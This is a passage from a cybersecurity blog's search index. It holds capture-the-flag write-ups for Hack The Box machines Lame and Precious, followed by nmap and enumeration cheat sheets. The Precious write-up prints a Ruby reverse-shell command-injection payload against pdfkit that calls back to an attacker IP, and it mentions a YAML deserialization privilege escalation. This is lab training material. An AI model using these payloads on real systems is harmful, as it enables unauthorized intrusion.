Control connection is plain text | Data connections will be plain text | vsFTPd 2.3.4 - secure, fast, stable |_End of status |_ftp-anon: Anonymous FTP login allowed (FTP code 230) 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) | ssh-hostkey: | 1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA) |_ 2048 5656240f211ddea72bae61b1243de8f3 (RSA) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_smb2-time: Protocol negotiation failed (SMB2) | smb-os-discovery: | OS: Unix (Samba 3.0.20-Debian) | Computer name: lame | NetBIOS computer name: | Domain name: hackthebox.gr | FQDN: lame.hackthebox.gr |_ System time: 2023-05-30T12:14:42-04:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: 1h59m54s, deviation: 2h49m43s, median: -6s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 63.17 seconds Checked SMB After googling, found a vulnerable FTP version Checked SMB version Googling revealed Username map script Since I am trying not to use Metasploit, I searched for exploit and found one on github Root Let\u0026rsquo;s run exploit and get foothold Got reverse shell Let\u0026rsquo;s check user Oh, we are root ","date":"May 23, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/lame/images/lame.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/lame/","summary":"Lame Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV 10.10.10.3 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 17:14 BST Nmap scan report for 10.10.10.3 (10.10.10.3) Host is up (0.10s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.16.3 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.","tags":["HTB"],"title":"[HTB] Machine: Lame"},{"categories":null,"contents":"Precious Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV -T4 10.10.11.189 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-16 11:09 EDT Nmap scan report for 10.10.11.189 (10.10.11.189) Host is up (0.14s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 845e13a8e31e20661d235550f63047d2 (RSA) | 256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA) |_ 256 33053dcd7ab798458239e7ae3c91a658 (ED25519) 80/tcp open http nginx 1.18.0 |_http-title: Did not follow redirect to http://precious.htb/ |_http-server-header: nginx/1.18.0 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 28.35 seconds Let\u0026rsquo;s check port 80 It\u0026rsquo;s a service that converts Web Pages to PDF Let\u0026rsquo;s supply anything and see what it returns I am running Burp Suite in the background So after supplying any url, we receive a pdf So I tried figuring out the backend service, or library that was responsible for conversion I took the response data from Burp Suite and used Cyber Chef to decode it We see the package and it\u0026rsquo;s version After a little bit of googling Let\u0026rsquo;s test it I set up tcpdump to listen to ICMP Success Let\u0026rsquo;s get a foothold Foothold I used revshells.com to create a payload for Ruby (It was revealed in Burp Suite responses and pdfkit is a Ruby package) http://10.10.16.37:8000/index.html?p=#{\u0026#39;%20`ruby -rsocket -e\u0026#39;spawn(\u0026#34;sh\u0026#34;,[:in,:out,:err]=\u0026gt;TCPSocket.new(\u0026#34;10.10.16.37\u0026#34;,6666))\u0026#39;`\u0026#39;} Try the payload And We get a reverse shell Now we need to privesc After running the linpeas.sh We see that we have another user ╔══════════╣ Users with console henry❌1000:1000:henry,,,:/home/henry:/bin/bash root❌0:0:root:/root:/bin/bash ruby❌1001:1001::/home/ruby:/bin/bash User After checking the home directory of the ruby user I found henry credentials And su to henry Let\u0026rsquo;s get root Root The first thing I check is sudo privileges And we get a result Let\u0026rsquo;s check the file According to the comments, the script loads the list of dependencies from the dependencies.yaml and compares them to the ones already installed After googling We find that there is a yaml injection or https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Insecure%20Deserialization/YAML/#pyyaml Check the version So let\u0026rsquo;s try Firstly, it seems like the script searches for dependencies.yaml file in the directory where we execute the command So we can create dependencies.yaml anywhere where we have the privileges to do so Copy the payload from the links above Run the command And we get our flag ","date":"May 20, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/precious/images/precious.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/precious/","summary":"Precious Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV -T4 10.10.11.189 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-16 11:09 EDT Nmap scan report for 10.10.11.189 (10.10.11.189) Host is up (0.14s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 845e13a8e31e20661d235550f63047d2 (RSA) | 256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA) |_ 256 33053dcd7ab798458239e7ae3c91a658 (ED25519) 80/tcp open http nginx 1.","tags":["HTB"],"title":"[HTB] Machine: Precious"},{"categories":null,"contents":"This section will contain Game Hacking notes and materials. Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel ","date":"April 22, 2023","hero":"/posts/cybersecurity/game-hacking/overview/images/gh.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/game-hacking/overview/","summary":"This section will contain Game Hacking notes and materials. Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel ","tags":["Guided Hacking","Game Hacking"],"title":"[Game Hacking] Overview"},{"categories":null,"contents":"This section will contain HTB notes, solutions and materials. Checkout official HTB website You can also checkout ippsec\u0026rsquo;s youtube channel or website, 0xdf\u0026rsquo;s youtube channel or website More links will be added\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/hackthebox/overview/images/htb.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/overview/","summary":"This section will contain HTB notes, solutions and materials. Checkout official HTB website You can also checkout ippsec\u0026rsquo;s youtube channel or website, 0xdf\u0026rsquo;s youtube channel or website More links will be added\u0026hellip; ","tags":["HTB"],"title":"[HTB] Overview"},{"categories":null,"contents":"This section will contain Active Directory notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/active_directory/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/active_directory/","summary":"This section will contain Active Directory notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Active Directory"],"title":"[Pentesting] Active Directory"},{"categories":null,"contents":"This section will contain Attacking Services notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/attacking_services/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/attacking_services/","summary":"This section will contain Attacking Services notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Attacking Services"],"title":"[Pentesting] Attacking Services"},{"categories":null,"contents":"This section will contain File Transfers notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/file_transfers/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/file_transfers/","summary":"This section will contain File Transfers notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["File Transfers"],"title":"[Pentesting] File Transfers"},{"categories":null,"contents":"This section will contain Footprinting and Enumeration notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/footprinting_and_enumeration/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/footprinting_and_enumeration/","summary":"This section will contain Footprinting and Enumeration notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Footprinting and Enumeration"],"title":"[Pentesting] Footprinting and Enumeration"},{"categories":null,"contents":"This section will contain Linux Privilege Escalation notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/linux_privilege_escalation/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/linux_privilege_escalation/","summary":"This section will contain Linux Privilege Escalation notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Linux Privilege Escalation"],"title":"[Pentesting] Linux Privilege Escalation"},{"categories":null,"contents":"This section will contain Mobile Pentesting notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/mobile_pentesting/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/mobile_pentesting/","summary":"This section will contain Mobile Pentesting notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Mobile Pentesting"],"title":"[Pentesting] Mobile Pentesting"},{"categories":null,"contents":"This section will contain OSINT notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/osint/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/osint/","summary":"This section will contain OSINT notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["OSINT"],"title":"[Pentesting] OSINT"},{"categories":null,"contents":"This section will contain Pivoting, Tunneling and Port Forwarding notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/pivoting_tunneling_and_port_forwarding/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/pivoting_tunneling_and_port_forwarding/","summary":"This section will contain Pivoting, Tunneling and Port Forwarding notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Pivoting, Tunneling and Port Forwarding"],"title":"[Pentesting] Pivoting, Tunneling and Port Forwarding"},{"categories":null,"contents":"This section will contain Shells and Payloads notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/shells_and_payloads/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/shells_and_payloads/","summary":"This section will contain Shells and Payloads notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Shells and Payloads"],"title":"[Pentesting] Shells and Payloads"},{"categories":null,"contents":"This section will contain Web Attacks notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/web_attacks/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/web_attacks/","summary":"This section will contain Web Attacks notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Web Attacks"],"title":"[Pentesting] Web Attacks"},{"categories":null,"contents":"This section will contain Windows Privilege Escalation notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/windows_privilege_escalation/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/windows_privilege_escalation/","summary":"This section will contain Windows Privilege Escalation notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Windows Privilege Escalation"],"title":"[Pentesting] Windows Privilege Escalation"},{"categories":null,"contents":"This section will contain pwn.college notes, solutions and materials. Checkout pwn.college website Checkout pwn.college Youtube channel ","date":"April 22, 2023","hero":"/posts/cybersecurity/pwn.college/overview/images/pwn.college.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pwn.college/overview/","summary":"This section will contain pwn.college notes, solutions and materials. Checkout pwn.college website Checkout pwn.college Youtube channel ","tags":["pwn.college"],"title":"[pwn.college] Overview"},{"categories":null,"contents":"Wfuzz Options ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/ffuf/","summary":"Wfuzz Options ","tags":null,"title":"Ffuf"},{"categories":null,"contents":"Gobuster Options ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/gobuster/","summary":"Gobuster Options ","tags":null,"title":"Gobuster"},{"categories":null,"contents":"Kiterunner Options ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/kiterunner/","summary":"Kiterunner Options ","tags":null,"title":"Kiterunner"},{"categories":null,"contents":"Miscellaneous Options Miscellaneous Options for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep \u0026quot;bytes from\u0026quot; \u0026amp;); done - Scan for hosts in subnet nc -w 1 192.168.110.52 1-10000 -v -z -n 2\u0026gt;\u0026amp;1 | grep succeeded - Scan host range of ports using nc for i in {1..65535}; do (echo \u0026gt; /dev/tcp/192.168.1.1/$i) \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; echo $i is open; done - Scan host range of ports gobuster dir -u https://10.10.10.7/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k - gobuster ignore certificate ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u 'http://\u0026lt;website\u0026gt;.com' -H 'Host: FUZZ.\u0026lt;website\u0026gt;.com' - ffuf vhost enumeration ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/misc/","summary":"Miscellaneous Options Miscellaneous Options for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep \u0026quot;bytes from\u0026quot; \u0026amp;); done - Scan for hosts in subnet nc -w 1 192.168.110.52 1-10000 -v -z -n 2\u0026gt;\u0026amp;1 | grep succeeded - Scan host range of ports using nc for i in {1..65535}; do (echo \u0026gt; /dev/tcp/192.168.1.1/$i) \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; echo $i is open; done - Scan host range of ports gobuster dir -u https://10.","tags":null,"title":"Miscellaneous"},{"categories":null,"contents":"Nmap Options Nmap Options 10.10.10.0/24 - Target network range. -sn - Disables port scanning. -Pn - Disables ICMP Echo Requests -n - Disables DNS Resolution. -PE - Performs the ping scan by using ICMP Echo Requests against the target. --packet-trace - Shows all packets sent and received. --reason - Displays the reason for a specific result. --disable-arp-ping - Disables ARP Ping Requests. --top-ports=\u0026lt;num\u0026gt; - Scans the specified top ports that have been defined as most frequent. -p- - Scan all ports. -p22-110 - Scan all ports between 22 and 110. -p22,25 - Scans only the specified ports 22 and 25. -F - Scans top 100 ports. -sS - Performs an TCP SYN-Scan. -sA - Performs an TCP ACK-Scan. -sU - Performs an UDP Scan. -sV - Scans the discovered services for their versions. -sC - Perform a Script Scan with scripts that are categorized as \u0026ldquo;default\u0026rdquo;. --script \u0026lt;script\u0026gt; - Performs a Script Scan by using the specified scripts. -O - Performs an OS Detection Scan to determine the OS of the target. -A - Performs OS Detection, Service Detection, and traceroute scans. -D RND:5 - Sets the number of random Decoys that will be used to scan the target. -e - Specifies the network interface that is used for the scan. -S 10.10.10.200 - Specifies the source IP address for the scan. -g - Specifies the source port for the scan. --dns-server \u0026lt;ns\u0026gt; - DNS resolution is performed by using a specified name server. Output Options -oA filename - Stores the results in all available formats starting with the name of \u0026ldquo;filename\u0026rdquo;. -oN filename - Stores the results in normal format with the name \u0026ldquo;filename\u0026rdquo;. -oG filename - Stores the results in \u0026ldquo;grepable\u0026rdquo; format with the name of \u0026ldquo;filename\u0026rdquo;. -oX filename - Stores the results in XML format with the name of \u0026ldquo;filename\u0026rdquo;. Performance Options --max-retries \u0026lt;num\u0026gt; - Sets the number of retries for scans of specific ports. --stats-every=5s - Displays scan\u0026rsquo;s status every 5 seconds. -v/-vv - Displays verbose output during the scan. --initial-rtt-timeout 50ms - Sets the specified time value as initial RTT timeout. --max-rtt-timeout 100ms - Sets the specified time value as maximum RTT timeout. --min-rate 300 - Sets the number of packets that will be sent simultaneously. -T \u0026lt;0-5\u0026gt; - Specifies the specific timing template. ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/nmap/","summary":"Nmap Options Nmap Options 10.10.10.0/24 - Target network range. -sn - Disables port scanning. -Pn - Disables ICMP Echo Requests -n - Disables DNS Resolution. -PE - Performs the ping scan by using ICMP Echo Requests against the target. --packet-trace - Shows all packets sent and received. --reason - Displays the reason for a specific result. --disable-arp-ping - Disables ARP Ping Requests. --top-ports=\u0026lt;num\u0026gt; - Scans the specified top ports that have been defined as most frequent.","tags":null,"title":"Nmap"},{"categories":null,"contents":"Wfuzz Options ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/wfuzz/","summary":"Wfuzz Options ","tags":null,"title":"Wfuzz"}]